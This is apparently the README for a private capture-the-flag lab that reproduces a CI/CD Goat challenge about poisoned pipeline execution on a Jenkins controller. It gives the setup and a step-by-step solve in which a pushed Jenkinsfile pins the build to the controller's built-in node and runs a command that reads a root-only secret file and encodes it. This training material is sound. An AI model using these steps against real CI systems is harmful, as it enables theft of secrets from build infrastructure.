# Cheshire Cat: pipeline escape to the Jenkins controller (CyberCTF lab)

A bespoke, self-contained reproduction of the **Cheshire Cat** challenge from
[CI/CD Goat](https://github.com/cider-security-research/cicd-goat) — OWASP **CICD-SEC-4, Poisoned
Pipeline Execution** exploiting **CICD-SEC-5, Insufficient Pipeline-Based Access Controls**.
Wonderland runs CI on a **Jenkins** controller that builds the `Wonderland/cheshire-cat` repository
(hosted on a **Gitea** server) on every branch and pull request. Policy says application builds run
on **dedicated build agents**, never on the controller — the controller's filesystem holds
operational secrets, including `flag5.txt` in its home directory. But the controller's own **Built-In
Node** is left with executors, so nothing stops a pipeline from pinning `agent { label 'built-in' }`
to run on the controller itself, read the file and exfiltrate it. An attacker with write access to
the repo does exactly that, pushes a branch and opens a pull request; the pipeline runs on the
controller and the flag lands in the build console. This is **Direct-PPE** across weak PBAC.

**Private lab content — do not copy into any public repository.**

## Infrastructure

Two machines, the minimum a live-pipeline attack needs:

| Machine | What |
|---|---|
| `jenkins` | Jenkins controller, configured by Configuration-as-Code. A Job DSL seed creates the `wonderland-cheshire-cat` multibranch pipeline (git-backed, branch discovery, rescanned every minute). The Built-In Node keeps executors (`numExecutors: 2`) in **EXCLUSIVE** usage mode — so it runs only jobs that explicitly target its `built-in` label. `flag5.txt` is a **root-only file in the controller's home**; Jenkins runs as root with `HOME=/root`. `git` + `curl` are present for the in-machine solver. |
| `gitea` | Gitea git host. The setup job provisions the `Wonderland` org, the private `cheshire-cat` repo, the attacker `alice` (write) and the poller `jenkins` (read), then pushes the sample project and its `Jenkinsfile` (which runs on `agent { label 'linux' }` — the dedicated build agents). |

No GitLab, CTFd, prod box or SSH agents — only what this one vulnerability needs. The web ports
listen on container `8080` (Jenkins) and `3000` (Gitea); the host ports are assigned dynamically by
the runner (see below). Jenkins is slow to boot — allow a few minutes.

> There is no separate build-agent machine: the repository's `Jenkinsfile` targets the dedicated
> `linux` agents, which do not exist in this two-machine lab, so the honest/baseline `main` build
> simply stays pending. That is faithful to the lesson — "all jobs run on dedicated agents" — and is
> exactly why the attacker must escape onto the controller's Built-In Node to get code execution.

## Objective

One per-player objective (`.ctf/objectives.json`), graded by CyberBackend:

| Key | Evidence | What the player recovers |
|---|---|---|
| `cheshire-cat` | `SECRET` (`%s`) | Wonderland's `flag5`, read from the Jenkins controller's filesystem by a pipeline escaped onto the Built-In Node |

Intended path: clone `Wonderland/cheshire-cat` with write creds → on a new branch, change the
`Jenkinsfile`'s agent to `agent { label 'built-in' }` and add `sh 'cat ~/flag5.txt | rev | base64'`
→ push and open a pull request → the pipeline runs **on the controller** and prints the exfiltrated
blob → `base64 -d | rev` to recover the flag. The recovered value is the flag.

## Per-player flag

The flag is issued per player by CyberCTF and handed to the lab by the launcher as a **file**
(`isoloom.yml` `inputs: [CTF_FLAG_CHESHIRE_CAT]`, delivered via
`files: [{ path: /run/lab/secrets/flag5, input: CTF_FLAG_CHESHIRE_CAT }]` on the Jenkins machine),
never an environment variable, so it never appears in `docker inspect`, an image layer or a
generated file. The Jenkins entrypoint stages the file as `~/flag5.txt` (i.e. `/root/flag5.txt`),
owned by root and mode `0400` — a **filesystem** secret on the controller, **not** a Jenkins
credential. Only a process running on the controller as root (a pipeline on the Built-In Node) can
read it, exactly as in the challenge.

An **offline start** (local, CI) leaves the input empty, and the lab stages its development
placeholder (`.ctf/objectives.json` `dev`) instead, so it still comes up and is solvable without a
launcher.

## Dynamic ports

Both web services declare `ports: { web: { port: <n>, protocol: http, publish: true } }`.
`publish: true` asks the runner for a **free host port it picks at `up` time** — there is no fixed
host port anywhere in the spec, message, configs or checks (the only literals are in-container
loopback and the lab network CIDR). The `message` reads the real URLs back through
`{{ machines.jenkins.ports.web.url }}` and `{{ machines.gitea.ports.web.url }}`.

## Run it

Described once in [`isoloom.yml`](isoloom.yml) ([Isoloom](https://www.isoloom.com)); run on Docker
through the [Isothrum](https://www.isothrum.com) runner:

```bash
isoloom validate .
isoloom generate . --target docker
isothrum up . --target docker          # add --secret-from-env CTF_FLAG_CHESHIRE_CAT for a real value
isothrum check . --target docker       # Jenkins is slow; the solver waits for the build
isothrum down . --target docker
```

Solve it the way the check does:

```bash
git clone http://alice:alice@<gitea-url>/Wonderland/cheshire-cat.git
cd cheshire-cat && git checkout -b challenge5
# edit Jenkinsfile: agent { label 'built-in' } + sh 'cat ~/flag5.txt | rev | base64'
git commit -am poison && git push origin challenge5
# open a PR in Gitea, then read the build console in Jenkins: `base64 -d <blob> | rev` is the flag
```

## Layout

- `build/jenkins/Dockerfile` — Jenkins LTS + plugins, runs as root with `HOME=/root` to own the flag file
- `build/jenkins/casc/jenkins.yaml` — Configuration-as-Code: `numExecutors: 2` + `mode: EXCLUSIVE` (the PBAC hole), security, the Job DSL seed
- `build/jenkins/casc/jobdsl/cheshire-cat.groovy` — the multibranch pipeline (git branch discovery + 1-minute rescan)
- `build/jenkins/entrypoint.sh` — stages the per-player flag as the root-only `~/flag5.txt`
- `build/jenkins/solve.sh` — the solver / self-check (`/usr/local/bin/cc-solve`): performs the Built-In-Node escape end to end and proves the flag was exfiltrated, never printing it
- `build/gitea/Dockerfile`, `app.ini`, `entrypoint.sh` — the installed Gitea host
- `build/gitea/seed.sh` — the `setup` step: provisions the org/users/repo and pushes the sample project
- `build/gitea/repo-src/` — the original `cheshire` package and its `Jenkinsfile` (runs on the `linux` agents)
- `.ctf/` — `metadata.json` and `objectives.json` (the catalogue registration)
- `UPSTREAM.md` — attribution, and the faithful deviations (the trigger; the two-machine shape)
- `.isoloom/` — generated by `isoloom generate` (git-ignored; don't edit)
